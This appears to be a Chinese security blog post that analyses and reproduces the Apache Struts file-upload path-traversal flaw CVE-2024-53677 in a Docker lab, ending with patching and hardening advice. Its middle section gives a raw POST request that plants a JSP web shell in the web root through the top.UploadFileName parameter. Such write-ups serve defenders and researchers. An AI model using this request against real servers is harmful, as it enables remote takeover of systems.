#  Apache Struts 文件上传漏洞分析与复现指南   
云梦DC  云梦安全   2024-12-26 01:00  
  
## 漏洞背景  
  
Apache Struts 是一种应用程序框架，应用应较广泛。在为用户提供文件上传功能时，Struts 采用了 FileUploadInterceptor 来处理上传请求。然而，该功能存在路径遍历漏洞，攻击者可通过构造恶意请求，将文件上传至不应该的目录，这可能导致远程代码执行（RCE）、敏感数据損失以及系统全局安全的破坏。  
### 漏洞影响版本  
- **Struts 2.0.0 至 2.3.37**  
  
- **Struts 2.5.0 至 2.5.33**  
  
- **Struts 6.0.0 至 6.3.0.2**  
  
### 漏洞添加解释  
  
FileUploadInterceptor 在处理文件上传时，对于用户输入的文件名和路径编码验证不固，导致可通过路径遍历将文件上传至目标文件夹之外，例如系统根目录。通过上传 Web Shell，攻击者可以完全控制目标系统。  
## 环境搭建  
  
为了复现该漏洞，可通过以下步骤搭建环境：  
### 环境代码仓库  
  
进入资源仓库：  
```
git clone https://github.com/wi1kwegam4a/VulhubExpand
cd VulhubExpand/Struts2/CVE-2024-53677
```  
### 启动 Docker 环境  
  
运行以下命令：  
```
docker-compose up -d
```  
  
启动后，通过浏览器访问上传接口：  
- URL：http://127.0.0.1:8080/upload.action  
  
### 初始化步骤  
  
随机上传一张图片，该操作将创建一个 **uploads**  
 文件夹，便于后续解析和涉深判断。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ndxZsFvkmpyvb4bS02NIe9uF1ztjhTNBORM2QCcKVxFMyIoOG4bkQtSEWhibEAFgBG9s8xEoRMCm8opJYGc1Esg/640?wx_fmt=png&from=appmsg "")  
## 漏洞复现  
### 构造恶意请求  
  
通过以下 POST 请求，将恶意文件上传至系统根目录：  
```
POST /upload.action HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: multipart/form-data; boundary=---------------------------10646135771952845599584984154
Content-Length: 363

-----------------------------10646135771952845599584984154
Content-Disposition: form-data; name="Upload"; filename="test.txt"
Content-Type: text/plain

PAYLOAD
-----------------------------10646135771952845599584984154
Content-Disposition: form-data; name="top.UploadFileName";../shell.jsp
-----------------------------10646135771952845599584984154--
```  
- 该请求利用 top.UploadFileName  
 参数，将上传文件路径调整到 ROOT 目录。  
  
- PAYLOAD  
 为恶意代码内容，例如 JSP Web Shell。  
  
### 观察效果  
  
上传成功后，通过浏览器访问：  
```
http://127.0.0.1:8080/shell.jsp
```  
  
如果恶意文件含有 Web Shell 代码，即可通过工具连接目标服务器，控制系统。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ndxZsFvkmpyvb4bS02NIe9uF1ztjhTNB6sibrBUpxxV43e4pibaNxMmqxnpBBw0jL3icFwSWicfJCYuusCBFfOj4Vg/640?wx_fmt=png&from=appmsg "")  
## 防御建议  
1. **升级 Struts版本：**  
确保升级到最新版本，避免使用受影响版本。  
  
1. **限制文件上传路径：**  
通过添加文件路径规则，防止文件上传到不应该的目录。  
  
1. **文件名称校验：**  
为上传文件加上固定后缀名规则，禁止非预期后缀名文件上传。  
  
1. **安全强化：**  
  
1. 安装 Web 应用防火墙（WAF），检测和拦截可疑请求。  
  
1. 使用权限隔离，为应用限制文件写入权限。  
  
## 总结  
  
本次分析和复现了 Apache Struts 文件上传漏洞（CVE-2024-53677），分享了其应用环境、环境搭建与漏洞复现的过程。通过这些步骤，我们能够更好地理解路径遍历对文件上传功能带来的安全威胁，并通过实现功能防御，增强系统安全性。  
  
